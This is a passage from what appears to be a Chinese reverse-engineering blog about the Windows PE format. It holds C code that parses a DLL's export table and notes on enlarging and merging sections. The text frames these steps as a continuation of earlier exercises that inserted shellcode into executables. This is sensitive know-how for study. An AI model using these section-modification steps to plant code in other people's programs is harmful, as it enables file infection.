%x\n&quot;</span>,name,*(AddressOfFuncitons + ordinal));<br>                <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Func Not Found\n&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="根据函数序号找函数"><a href="#根据函数序号找函数" class="headerlink" title="根据函数序号找函数"></a>根据函数序号找函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-type">void</span> <span class="hljs-title function_">GetFuncAddrByOrd</span><span class="hljs-params">(<span class="hljs-type">char</span>* Buffer,<span class="hljs-type">int</span> Ord)</span>&#123;<br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_FILE_HEADER FILEHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_OPTIONAL_HEADER64 OptionalHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>    DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>    NTHeader = (PIMAGE_NT_HEADERS)(Buffer + DosHeader-&gt;e_lfanew);<br>    FILEHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>    OptionalHeader = (PIMAGE_OPTIONAL_HEADER64)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>    SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FILEHeader-&gt;SizeOfOptionalHeader);<br><br>    DWORD Export_Table_RVA = OptionalHeader-&gt;DataDirectory[<span class="hljs-number">0</span>].VirtualAddress;<br><br>    <span class="hljs-keyword">if</span>(Export_Table_RVA == <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This PE File Has Not Export Table!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> ;<br>    &#125;<br>    DWORD Export_Table_FOA = RVA_TO_FOA(Export_Table_RVA,Buffer);<br>    PIMAGE_EXPORT_DIRECTORY _Export_Table = (PIMAGE_EXPORT_DIRECTORY)(Buffer + Export_Table_FOA);<br>    <br>    <span class="hljs-comment">//函数地址表</span><br>    DWORD* AddressOfFuncitons = (DWORD*)(Buffer + RVA_TO_FOA(_Export_Table-&gt;AddressOfFunctions,Buffer));<br>    <span class="hljs-type">int</span> base = _Export_Table-&gt;Base;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;base: %d\n&quot;</span>,base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d found: %x\n&quot;</span>,Ord,*(AddressOfFuncitons + Ord-base));<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="总代码"><a href="#总代码" class="headerlink" title="总代码"></a>总代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br>DWORD <span class="hljs-title function_">Size</span><span class="hljs-params">(FILE* fp)</span>&#123;<br>    DWORD size = <span class="hljs-number">0</span>;<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_END);<br>    size = ftell(fp);<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_SET);<br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br><br>DWORD <span class="hljs-title function_">RVA_TO_FOA</span><span class="hljs-params">(DWORD RVA,<span class="hljs-type">char</span>* Buffer)</span>&#123;<br>   PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER FileHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_OPTIONAL_HEADER OptionalHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>    FileHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>OptionalHeader = (PIMAGE_OPTIONAL_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader);<br>    <br>    <span class="hljs-keyword">if</span> (RVA &lt; OptionalHeader-&gt;SizeOfHeaders)<br>&#123;<br><span class="hljs-keyword">return</span> RVA;<br>&#125;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;FileHeader-&gt;NumberOfSections<span class="hljs-number">-1</span>;i++)&#123;<br>        <span class="hljs-keyword">if</span>(RVA &gt;= SectionHeader-&gt;VirtualAddress &amp;&amp; RVA &lt; (SectionHeader+<span class="hljs-number">1</span>)-&gt;VirtualAddress)&#123;<br>            DWORD offset = RVA - SectionHeader-&gt;VirtualAddress;<br>            <span class="hljs-keyword">return</span> SectionHeader-&gt;PointerToRawData + offset;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            SectionHeader +=<span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br><br>     <span class="hljs-comment">//最后一个节区</span><br>    SectionHeader +=<span class="hljs-number">1</span>;<br>    DWORD offset = RVA - SectionHeader-&gt;VirtualAddress;<br>    <span class="hljs-keyword">return</span> SectionHeader-&gt;PointerToRawData + offset;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">GetFuncAddrByName</span><span class="hljs-params">(<span class="hljs-type">char</span>* Buffer,<span class="hljs-type">char</span>* name)</span>&#123;<br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_FILE_HEADER FILEHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_OPTIONAL_HEADER64 OptionalHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>    DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>    NTHeader = (PIMAGE_NT_HEADERS)(Buffer + DosHeader-&gt;e_lfanew);<br>    FILEHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>    OptionalHeader = (PIMAGE_OPTIONAL_HEADER64)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>    SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FILEHeader-&gt;SizeOfOptionalHeader);<br><br>    DWORD Export_Table_RVA = OptionalHeader-&gt;DataDirectory[<span class="hljs-number">0</span>].VirtualAddress;<br><br>    <span class="hljs-keyword">if</span>(Export_Table_RVA == <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This PE File Has Not Export Table!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> ;<br>    &#125;<br>    DWORD Export_Table_FOA = RVA_TO_FOA(Export_Table_RVA,Buffer);<br>    PIMAGE_EXPORT_DIRECTORY _Export_Table = (PIMAGE_EXPORT_DIRECTORY)(Buffer + Export_Table_FOA);<br>    <br>    <span class="hljs-comment">//函数地址表</span><br>    DWORD* AddressOfFuncitons = (DWORD*)(Buffer + RVA_TO_FOA(_Export_Table-&gt;AddressOfFunctions,Buffer));<br>    <span class="hljs-comment">//序号表</span><br>    WORD* AddressOfOrdinals = (WORD*)(Buffer +  RVA_TO_FOA(_Export_Table-&gt;AddressOfNameOrdinals,Buffer));<br>    <span class="hljs-comment">//函数名称表</span><br>    DWORD* AddressOfNames = (DWORD*)(Buffer + RVA_TO_FOA(_Export_Table-&gt;AddressOfNames,Buffer));<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; _Export_Table-&gt;NumberOfNames;i++)&#123;<br>        <span class="hljs-type">char</span>* nameaddr = Buffer + RVA_TO_FOA(*(AddressOfNames + i),Buffer);<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(name,nameaddr))&#123;<br>            <span class="hljs-type">int</span> ordinal = *(AddressOfOrdinals + i);<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s found: %x\n&quot;</span>,name,*(AddressOfFuncitons + ordinal));<br>                <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Func Not Found\n&quot;</span>);<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">GetFuncAddrByOrd</span><span class="hljs-params">(<span class="hljs-type">char</span>* Buffer,<span class="hljs-type">int</span> Ord)</span>&#123;<br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_FILE_HEADER FILEHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_OPTIONAL_HEADER64 OptionalHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>    DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>    NTHeader = (PIMAGE_NT_HEADERS)(Buffer + DosHeader-&gt;e_lfanew);<br>    FILEHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>    OptionalHeader = (PIMAGE_OPTIONAL_HEADER64)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>    SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FILEHeader-&gt;SizeOfOptionalHeader);<br><br>    DWORD Export_Table_RVA = OptionalHeader-&gt;DataDirectory[<span class="hljs-number">0</span>].VirtualAddress;<br><br>    <span class="hljs-keyword">if</span>(Export_Table_RVA == <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This PE File Has Not Export Table!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> ;<br>    &#125;<br>    DWORD Export_Table_FOA = RVA_TO_FOA(Export_Table_RVA,Buffer);<br>    PIMAGE_EXPORT_DIRECTORY _Export_Table = (PIMAGE_EXPORT_DIRECTORY)(Buffer + Export_Table_FOA);<br>    <br>    <span class="hljs-comment">//函数地址表</span><br>    DWORD* AddressOfFuncitons = (DWORD*)(Buffer + RVA_TO_FOA(_Export_Table-&gt;AddressOfFunctions,Buffer));<br>    <span class="hljs-type">int</span> base = _Export_Table-&gt;Base;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;base: %d\n&quot;</span>,base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d found: %x\n&quot;</span>,Ord,*(AddressOfFuncitons + Ord-base));<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Export_Table</span><span class="hljs-params">(<span class="hljs-type">char</span>* Buffer)</span>&#123;<br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_FILE_HEADER FILEHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_OPTIONAL_HEADER64 OptionalHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>    DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>    NTHeader = (PIMAGE_NT_HEADERS)(Buffer + DosHeader-&gt;e_lfanew);<br>    FILEHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>    OptionalHeader = (PIMAGE_OPTIONAL_HEADER64)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>    SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FILEHeader-&gt;SizeOfOptionalHeader);<br><br>    DWORD Export_Table_RVA = OptionalHeader-&gt;DataDirectory[<span class="hljs-number">0</span>].VirtualAddress;<br><br>    <span class="hljs-keyword">if</span>(Export_Table_RVA == <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This PE File Has Not Export Table!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    DWORD Export_Table_FOA = RVA_TO_FOA(Export_Table_RVA,Buffer);<br>    PIMAGE_EXPORT_DIRECTORY _Export_Table = (PIMAGE_EXPORT_DIRECTORY)(Buffer + Export_Table_FOA);<br><br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Characteristics: %#x\n&quot;</span>, _Export_Table-&gt;Characteristics);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;TimeDateStamp: %#x\n&quot;</span>, _Export_Table-&gt;TimeDateStamp);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;MajorVersion: %#x\n&quot;</span>, _Export_Table-&gt;MajorVersion);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;MinorVersion: %#x\n&quot;</span>, _Export_Table-&gt;MinorVersion);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Name: %s\n&quot;</span>, (Buffer + RVA_TO_FOA(_Export_Table-&gt;Name, Buffer)));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Base: %#x\n&quot;</span>, _Export_Table-&gt;Base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NumberOfFunctions: %#x\n&quot;</span>, _Export_Table-&gt;NumberOfFunctions);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NumberOfNames: %#x\n&quot;</span>, _Export_Table-&gt;NumberOfNames);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;AddressOfFunctions: %#x\n&quot;</span>, _Export_Table-&gt;AddressOfFunctions);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;AddressOfNames: %#x\n&quot;</span>, _Export_Table-&gt;AddressOfNames);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;AddressOfNameOrdinals: %#x\n&quot;</span>, _Export_Table-&gt;AddressOfNameOrdinals);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;==========函数地址表 AddressOfFuncitons==========\n&quot;</span>);<br>    DWORD* AddressOfFuncitons = (DWORD*)(Buffer + RVA_TO_FOA(_Export_Table-&gt;AddressOfFunctions,Buffer));<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; _Export_Table-&gt;NumberOfFunctions;i++)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;下标：%d 函数地址：%x\n&quot;</span>, i , *(AddressOfFuncitons + i));<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;==========序号表 AddressOfOrdinals==========\n&quot;</span>);<br>    WORD* AddressOfOrdinals = (WORD*)(Buffer +  RVA_TO_FOA(_Export_Table-&gt;AddressOfNameOrdinals,Buffer));<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; _Export_Table-&gt;NumberOfNames; i++)<br>    &#123;<br>         <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;下标：%d 序号：%x\n&quot;</span>, i , *(AddressOfOrdinals + i));<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;==========函数名称表 AddressOfNames==========\n&quot;</span>);<br>    DWORD* AddressOfNames = (DWORD*)(Buffer + RVA_TO_FOA(_Export_Table-&gt;AddressOfNames,Buffer));<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; _Export_Table-&gt;NumberOfNames;i++)&#123;<br>        <span class="hljs-type">char</span>* nameaddres = Buffer + RVA_TO_FOA(*(AddressOfNames + i),Buffer);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;下标：%d 函数名称：%s\n&quot;</span>, i ,nameaddres);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span>* buffer;<br><br>    FILE* fp1 = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">errno_t</span> err_1 = fopen_s(&amp;fp1, <span class="hljs-string">&quot;C:\\Program Files\\Microsoft SQL Server Compact Edition\\v4.0\\sqlceme40.dll&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br><br>    DWORD size = Size(fp1);<br>    buffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(size);<br>    fread(buffer,size,<span class="hljs-number">1</span>,fp1);<br><br>    <span class="hljs-type">char</span>* func_name = <span class="hljs-string">&quot;DllRelease&quot;</span>;<br>    <span class="hljs-type">int</span> func_ord  = <span class="hljs-number">2</span>;<br>    Export_Table(buffer);<br>    GetFuncAddrByName(buffer,func_name);<br>    GetFuncAddrByOrd(buffer,func_ord);<br>&#125;<br></code></pre></td></tr></table></figure><p>NOTE：</p><ul><li>可以自己制作简单dll实验，也可以使用其他软件的dll</li><li>实际上，<code>GetFuncByName</code> 和 <code>GetFuncByOrd</code> 就相当于实现了之前调用dll时使用的一个系统函数 <code>GetProcAddress</code></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>导出表位于<code>IMAGE_DATA_DIRECTORY</code>的第一项，主要有以下几个成员</p><blockquote><p>​    DWORD   Base;&#x2F;&#x2F;导出函数起始序号<br>​    DWORD   NumberOfFunctions;       &#x2F;&#x2F;导出函数个数<br>​    DWORD   NumberOfNames；        &#x2F;&#x2F;以名称导出函数个数<br>​    DWORD   AddressOfFunctions;      &#x2F;&#x2F;导出函数地址表<br>​DWORD   AddressOfNames;      &#x2F;&#x2F;导出函数名称表<br>​    DWORD   AddressOfNameOrdinals; &#x2F;&#x2F;导出函数序号表 </p></blockquote><ul><li><p>Base 是导出序号里面最小的那个</p></li><li><p>NumberOfFuncitons &#x3D; 最大导出序号 - 最小导出序号 + 1</p></li><li><p>NumberOfNames &#x3D; 以名字导出函数个数</p></li><li><p>AddressOfFunctions，AddressOfNames，AddressOfNameOrdinals均是RVA，各自再指向一张表</p><ul><li><p>AddressOfFunctions 指向所有函数地址表，这里面函数地址也是RVA，</p></li><li><p>AddressOfNames 指向函数名称表，里面存储的是函数名字地址的RVA</p></li><li><p>AddressOfNameOrdinals 指向函数序号</p></li><li></li><li><p>AddressOfFunctions  数量 &#x3D; NumberOfFuncitons </p></li><li><p>AddressOfNames  数量 &#x3D; AddressOfNameOrdinals  数量 &#x3D; NumberOfNames</p></li></ul></li><li><p>使用名字找一个函数流程，其流程如下</p><ul><li>遍历名称地址表，从中一个一个比对，找到对应的函数，得到名称地址表的索引</li><li>使用相同索引在序号表里得到序号</li><li>以得到的序号为索引，在地址表里得到函数地址</li></ul></li><li><p>使用序号找一个函数流程，其流程如下</p><ul><li>直接用序号减base得到索引</li><li>使用索引在地址表里得到函数地址</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>PE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>PE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PE文件结构（六）</title>
    <link href="/2023/07/04/PE_5/"/>
    <url>/2023/07/04/PE_5/</url>
    
    <content type="html"><![CDATA[<p>PE练习，扩大节、合并节</p><span id="more"></span><h2 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h2><p>此前已经在一个节的空白区增加shellcode，而后又通过新增一个节的方式增加shellcode，实际上也可以通过对节进行合并、扩大操作来满足其他需求</p><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><h3 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h3><p>1.扩大最后一个节</p><p>2.合并所有节</p><h3 id="要求解决的问题"><a href="#要求解决的问题" class="headerlink" title="要求解决的问题"></a>要求解决的问题</h3><h4 id="扩大最后一个节"><a href="#扩大最后一个节" class="headerlink" title="扩大最后一个节"></a>扩大最后一个节</h4><p>Q1：为什么是扩大最后一个节</p><p>A1：如果扩大中间的节，那么后面的节的地址就会全部变化，所有地址就全都无法正常使用，而扩大最后一个节则不会影响已有地址</p><p>Q2：扩大多少合适</p><p>A2：最好也是文件对齐FileAlignmentr和内存对齐SectionAlignment的倍数，这样可以减少很多麻烦，就可以直接在原文件状态下扩大，而不需要再考虑对齐。</p><p>Q3：需要修改什么值</p><p>A3：跟大小有关的值都需要修改，OptionalHeader里的SizeOfImage，最后一个节目录项的Misc、SizeOfRawData、</p><h4 id="合并所有节"><a href="#合并所有节" class="headerlink" title="合并所有节"></a>合并所有节</h4><p>Q1：应该在哪种状态下合并</p><p>A1：只能在内存状态下合并，因为合并所有节后，只有一个节目录项，只能通过这个去找节区。如果在文件状态下合并，那么后面的节区都不能正确放到它们该处的位置上。而后直接将内存状态保存为文件状态，也就是说这时候文件状态就已经是内存对齐的了。</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307012317292.png"></p><p>Q2：需要修改哪些值</p><p>A2：FileHeader里的NumberOfSections改为1；因为文件状态就是内存状态所以第一个节目录项的Misc、PointerToRawData需要按照内存状态下改变。属性值也需要修改，因为是合并所有节，那么就应该具有所有节的属性</p><p>Q3：文件大小该如何确定</p><p>A3：可以很方便的使用OptionalHeader里的SizeOfImage减去第一个节表开始地方，剩下就都是合并节后的大小了，还需要将第一个节目录项的SizeOfRawData改为这个大小。</p><p>note：最后需要其他节目录项清零；fwrite的时候size要选为SizeOfImageHeader；实际上在Windows看来并不存在这些节的划分，只是人为通过不同的属性来划分，每一个节干特定的事，因此只需要把所有节属性都加上去，程序就一定可以正常运行，这是合并节可行的底层逻辑。</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span 